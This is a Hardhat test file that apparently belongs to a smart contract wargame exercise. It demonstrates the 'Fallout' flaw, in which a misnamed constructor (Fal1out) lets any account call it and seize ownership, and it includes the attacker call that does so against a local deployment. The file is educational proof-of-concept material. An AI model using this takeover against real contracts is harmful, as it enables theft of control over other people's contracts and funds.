const { expect } = require("chai");
const { ethers } = require("hardhat");

/**
 * Contract uses a regular function as a constructor, allowing strangers
 * to activate it and take ownership of the contract.
 */

describe("Fallout", function () {

    it("takes ownership of contract", async function () {
        [owner, attacker] = await ethers.getSigners();;
        const Fallout = await ethers.getContractFactory("Fallout");
        const fallout = await Fallout.deploy();
        await fallout.deployed();
        await fallout.Fal1out();
        expect(await fallout.owner()).to.equal(owner.address);

        await fallout.connect(attacker).Fal1out();
        expect(await fallout.owner()).to.equal(attacker.address);
    });
});
